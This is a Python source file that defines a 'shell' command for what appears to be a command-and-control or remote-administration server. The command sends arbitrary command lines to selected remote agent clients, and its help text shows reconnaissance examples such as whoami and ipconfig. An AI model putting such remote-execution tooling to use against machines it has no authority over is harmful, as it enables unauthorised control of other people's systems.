# src/server/commands/agent/remote_shell.py

from ..base import Command
from ..interact.shell import ShellManager
from ..registry import register
from config import MessageType as messtype
from rich import print


@register
class RemoteShellCommand(Command):
    name = "shell"
    description = "Run a shell command on selected client(s)"
    group = "agent"

    def execute(self, *args):
        from core.client_manager import Manager

        if not args:
            print(f"[blue_violet][!] No command provided. Use 'help {self.name}' for usage[/blue_violet]\n")
            return

        selected_clients = ShellManager.get_current_client()
        if not selected_clients:
            print("[blue_violet][!] No clients selected. Use 'client.select <id>' first[/blue_violet]\n")
            return

        command = " ".join(args)
        sent_clients = []
        missing_clients = []

        for cid in selected_clients:
            client = Manager.get_client(cid)
            if client is None:
                missing_clients.append(cid)
                continue

            client.session.send_request(messtype.COMMAND, command)
            sent_clients.append(cid)

        if sent_clients:
            print(f"[blue_violet][+] Sent agent shell command to {len(sent_clients)} client(s)[/blue_violet]")
            for cid in sent_clients:
                print(f"[white]  - {cid}[/white]")
            print()

        if missing_clients:
            print("[bright_red][!] Selected client(s) no longer exist:[/bright_red]")
            for cid in missing_clients:
                print(cid)
            print()

    @staticmethod
    def get_help():
        help_detail = f"""
        Description : Run a shell command on selected client(s)
        Usage : shell <command>
        Arguments:
            {'<command>':<20} : Command line to send to selected client(s)

        Examples : shell whoami
                   shell hostname
                   shell ipconfig
        """

        return help_detail
